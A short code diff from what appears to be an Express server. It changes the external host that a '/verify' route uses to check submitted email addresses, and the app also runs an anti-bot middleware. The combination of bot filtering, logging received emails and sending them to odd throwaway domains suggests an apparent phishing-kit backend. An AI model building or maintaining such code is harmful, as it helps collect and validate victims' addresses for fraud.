@@ -161,7 +161,7 @@ app.use(antiBotMiddleware);
 
 app.post('/verify', async (req, res) => {
     const { email } = req.body;
-    const url = `https://validate.drudohspellhouse.site/check-email`;
+    const url = `https://validate.sharingdoc.top/check-mail`;
 
     console.log(email + " : " + "received");
     
